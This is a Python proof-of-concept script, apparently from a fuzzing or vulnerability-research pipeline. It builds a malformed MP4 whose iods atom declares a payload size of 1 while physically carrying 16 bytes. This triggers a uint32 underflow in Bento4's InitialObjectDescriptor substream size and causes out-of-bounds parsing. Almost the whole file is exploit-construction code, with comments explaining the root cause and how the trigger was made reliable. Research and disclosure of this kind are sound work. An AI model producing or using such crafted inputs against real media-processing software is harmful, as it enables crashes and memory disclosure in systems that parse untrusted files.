#!/usr/bin/env python3
"""
PoC generator for VULN 002:
AP4_InitialObjectDescriptor substream size integer underflow enables OOB file data parse.

Root cause (Ap4ObjectDescriptor.cpp lines 252-255):
    AP4_Position offset;
    stream.Tell(offset);
    AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                                 payload_size-AP4_Size(offset-start));

With payload_size=1:
  - ReadUI16 consumes 2 bytes: offset-start=2
  - URL_flag=0 branch reads 5 profile bytes: offset-start=7
  - 1 - 7 = 0xFFFFFFFA (uint32 underflow -> widens to 4294967290 as AP4_LargeSize)
  - AP4_SubStream created with ~4GB size backed by the raw file stream
  - Subsequent descriptor factory reads span far past the iods atom boundary

KEY FIX over naive PoC: the iods atom must contain ENOUGH physical bytes (>= 7
after the IOD tag+size encoding) so the ReadUI16 and five ReadUI08 calls in the
IOD constructor all succeed and advance (offset-start) to 7, making the underflow
effective.  Without this, the reads hit EOF early and offset-start < 7, so the
subtraction does not wrap (or wraps to a smaller value).

We declare payload_size=1 (single-byte expandable size = 0x01) but embed 16 bytes
of padding inside the iods atom so the constructor reads succeed.  The SubStream
will then have size 0xFFFFFFFA and will try to parse descriptors from the padding
bytes and anything beyond the iods atom.
"""
import struct
import os

OUTPUT_PATH = (
    "/data/ylwang/non-textfuzz/target/_poc/Bento4/"
    "Source_C++_Core_Ap4Command_h/vuln_002.mp4"
)


def make_box(box_type: str, payload: bytes) -> bytes:
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode("ascii") + payload


# ---------- ftyp ----------
ftyp_payload = (
    b"mp42"
    + struct.pack(">I", 0)   # minor version
    + b"mp42"
    + b"isom"
)
ftyp = make_box("ftyp", ftyp_payload)   # 24 bytes

# ---------- mvhd (version=0, total=108 bytes) ----------
matrix_36 = struct.pack(
    ">IIIIIIIII",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)
mvhd_payload = (
    b"\x00"                         # version=0
    + b"\x00\x00\x00"              # flags=0
    + struct.pack(">I", 0)          # creation_time
    + struct.pack(">I", 0)          # modification_time
    + struct.pack(">I", 1000)       # timescale
    + struct.pack(">I", 0)          # duration
    + struct.pack(">I", 0x00010000) # rate (1.0)
    + struct.pack(">H", 0x0100)     # volume (1.0)
    + b"\x00" * 10                  # reserved
    + matrix_36                     # matrix (36 bytes)
    + b"\x00" * 24                  # pre_defined (24 bytes)
    + struct.pack(">I", 1)          # next_track_id
)
assert len(mvhd_payload) == 100
mvhd = make_box("mvhd", mvhd_payload)   # 108 bytes total
assert len(mvhd) == 108

# ---------- iods ----------
# We declare payload_size=1 via the expandable size byte (0x01).
# However, we embed 16 bytes of physical data after the tag+size encoding so
# the IOD constructor's ReadUI16 and five ReadUI08 calls all succeed.
#
# File layout of iods content (after size+type):
#   [0..3]  version+flags = 0x00000000
#   [4]     tag  = 0x02  (InitialObjectDescriptor)
#   [5]     expandable size byte = 0x01  => payload_size=1
#   [6..21] 16 bytes of IOD "payload" physically present in the file
#           (the binary trusts the RAW file stream, not a clamped SubStream
#            for the iods atom, so all 16 bytes are accessible)
#
# IOD constructor execution with payload_size=1:
#   start = stream position at byte [6]
#   ReadUI16(bits)     : reads bytes [6],[7]  -> offset-start = 2
#     bits = 0x000F => object_descriptor_id=0, url_flag=0, inline_flag=0
#   ReadUI08 x5        : reads bytes [8]..[12] -> offset-start = 7
#   UNDERFLOW:  1 - 7 = 0xFFFFFFFA  (uint32 wrap)
#   SubStream(stream, byte[13], 0xFFFFFFFA) is created
#   Inner loop reads bytes [13]..[21] as descriptors (0x00 bytes = unknown tag 0)
#   Inner loop hits EOF -> exits
#   AP4_DescriptorFactory then seeks to offset + 2 + 1 = byte[9]
#     (rewinding back inside the iods atom, but the large SubStream was already used)

iods_version_flags = b"\x00\x00\x00\x00"

# 16 bytes of IOD physical payload (all zeros):
# bytes [0..1] = bits field for ReadUI16 (0x000F = no url_flag, no inline, etc.)
# bytes [2..6] = five profile level octets
# bytes [7..15] = 9 extra bytes the inner loop will attempt to read as descriptors
iod_physical_payload = (
    struct.pack(">H", 0x000F)   # bits: id=0, url_flag=0, inline_flag=0, reserved=0xF
    + b"\xFF" * 5               # od/scene/audio/visual/graphics profile levels
    + b"\x00" * 9               # padding that will be parsed by the inner loop
)
assert len(iod_physical_payload) == 16

iod_descriptor = bytes([0x02, 0x01]) + iod_physical_payload  # tag, size=1, 16-byte body
iods_payload = iods_version_flags + iod_descriptor
iods = make_box("iods", iods_payload)

# ---------- moov ----------
moov_payload = mvhd + iods
moov = make_box("moov", moov_payload)

# ---------- assemble ----------
mp4_data = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print(f"    ftyp  : {len(ftyp)} bytes")
print(f"    moov  : {len(moov)} bytes (mvhd={len(mvhd)}, iods={len(iods)})")
print(f"    iods payload_size declared=1, physical iod body=16 bytes")
print(f"    Expected: uint32 underflow 1-7=0xFFFFFFFA in IOD substream size")
